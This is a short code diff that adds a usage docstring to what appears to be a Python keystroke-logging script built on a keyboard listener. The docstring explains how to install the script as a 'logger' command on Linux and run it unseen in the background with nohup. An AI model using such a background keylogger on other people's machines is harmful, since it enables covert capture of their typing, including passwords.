@@ -53,3 +53,14 @@ with Listener(
         on_press=on_press,
         on_release=on_release) as listener:
     listener.join()
+
+    
+"""
+If you want to make this a command in linux. Just do following:
+* Add #!/usr/bin/env python to the first line of this script.
+* Save the script with any name like "logger" in your path. Run command "echo $PATH" in terminal to know path locations.
+* then run command "chmod +x logger" to make it executable.
+I saved it to "/home/anuroop/.local/bin" with name logger.
+Now i can run it from anywhere in linux. Just by typing logger in terminal.
+You can also run it using command "nohup logger &" to run in background.
+"""
